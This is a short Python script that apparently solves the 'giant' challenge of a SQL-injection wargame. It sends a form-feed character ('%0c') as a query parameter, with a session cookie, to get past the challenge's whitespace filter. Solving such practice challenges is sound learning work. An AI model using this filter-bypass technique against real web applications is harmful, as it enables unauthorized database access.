import requests
from settings import session_id
from bs4_utils import print_html

url = "https://los.rubiya.kr/chall/giant_18a08c3be1d1753de0cb157703f75a5e.php"
cookies = {'PHPSESSID': session_id}

payload = '?shit=%0c'
url += payload
response = requests.get(url, cookies=cookies)
print_html(response.text)
